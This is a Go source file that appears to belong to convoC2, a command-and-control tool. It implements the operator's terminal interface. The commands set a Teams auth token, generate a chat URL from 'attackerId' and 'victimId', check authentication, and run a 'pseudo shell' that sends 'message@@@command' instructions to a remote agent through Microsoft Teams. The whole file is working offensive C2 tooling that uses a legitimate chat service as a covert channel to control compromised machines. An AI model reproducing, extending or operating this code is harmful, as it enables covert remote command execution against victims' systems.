package tui

import (
	"strings"

	"github.com/cxnturi0n/convoC2/pkg/server"
)

func (m *model) handleRegularCommands(enteredCommand string) {
	m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, promptStyle.Render(">> ")+enteredCommand)

	commandParts := strings.Fields(enteredCommand)
	if len(commandParts) == 0 {
		m.textInput.Reset()
		return
	}

	switch commandParts[0] {
	case "cmd":
		m.screen = AgentCmdScreen
		m.textInput.Prompt = agentPromptStyle.Render(m.selectedAgent.Username + " $> ")
		m.textInput.Placeholder = "<message>@@@<command>"
		m.textInput.Reset()

	case "token_update":
		if len(commandParts) > 1 {
			m.selectedAgent.AuthToken = strings.Join(commandParts[1:], " ")
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, successStyle.Render("Token updated."))
		} else {
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render("Missing token argument."))
		}
		m.textInput.Reset()

	case "url_update":
		if len(commandParts) > 1 {
			m.selectedAgent.ChatUrl = commandParts[1]
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, successStyle.Render("Chat URL updated."))
		} else {
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render("Missing URL argument."))
		}
		m.textInput.Reset()

	case "url_generate":
		if len(commandParts) > 2 {
			chatUrl, err := server.GetChatUrl(commandParts[1], commandParts[2], m.selectedAgent.AuthToken)
			if err != nil {
				m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render(err.Error()))
			} else {
				m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, successStyle.Render("Got chat URL, please check its validity with check_auth."))
				m.selectedAgent.ChatUrl = chatUrl
			}
		} else {
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render("Missing attackerId or victimId."))
		}
		m.textInput.Reset()

	case "check_auth":
		m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, successStyle.Render("Checking authentication..."))
		m.textInput.Reset()

		err := server.CheckAuth(m.selectedAgent.ChatUrl, m.selectedAgent.AuthToken)
		if err != nil {
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render(err.Error()))
		} else {
			m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, successStyle.Render("You are authenticated. Type cmd for launching pseudo shell."))
		}

	case "back":
		m.screen = AgentListScreen
		m.textInput.Prompt = promptStyle.Render(">> ")
		m.textInput.Reset()

	case "?":
		helpText := `
Available commands:
cmd - Enter pseudo shell
back - Go back to agent list
token_update <token> - Update the Teams Chat Token
url_generate <attackerId> <victimId> - Generates the Teams Chat URL
url_update <url> - Update the Teams Chat URL
check_auth - Check if chat URL and token are valid
quit - Exit the program
`
		m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, helpText)
		m.textInput.Reset()

	default:
		m.selectedAgent.CommandHistory = append(m.selectedAgent.CommandHistory, errorStyle.Render("Unknown command"))
		m.textInput.Reset()
	}
}

func (m *model) handleCmdSession(enteredCommand string) {
	if enteredCommand == "back" {
		// Exit cmd mode and reset prompt
		m.screen = AgentScreen
		m.textInput.Prompt = promptStyle.Render(">> ") // Reset to normal mode prompt
		m.textInput.Placeholder = "Type ? for a list of commands"
		return
	}
	m.selectedAgent.CommandHistoryCmd = append(m.selectedAgent.CommandHistoryCmd, m.textInput.Prompt+enteredCommand)

	parts := strings.Split(enteredCommand, "@@@")
	if len(parts) != 2 {
		m.selectedAgent.CommandHistoryCmd = append(m.selectedAgent.CommandHistoryCmd, errorStyle.Render("Invalid format. Use: <message>@@@<command>"))
		return
	}

	message := parts[0]
	command := parts[1]

	if m.selectedAgent.ChatUrl == "" {
		m.selectedAgent.CommandHistoryCmd = append(m.selectedAgent.CommandHistoryCmd, errorStyle.Render("Error: chatUrl is not set. Use url_update <url> to set the chat URL."))
		return
	}

	output, err := server.ExecuteCmdPostRequestWithMessageAndCommand(
		m.selectedAgent.ChatUrl,
		m.selectedAgent.AuthToken,
		message,
		command,
		m.selectedAgent.AgentId,
		m.commandResponseChan,
	)

	if err != nil {
		m.selectedAgent.CommandHistoryCmd = append(m.selectedAgent.CommandHistoryCmd, errorStyle.Render(err.Error()))
	} else {
		m.selectedAgent.CommandHistoryCmd = append(m.selectedAgent.CommandHistoryCmd, successStyle.Render(output))
	}
}
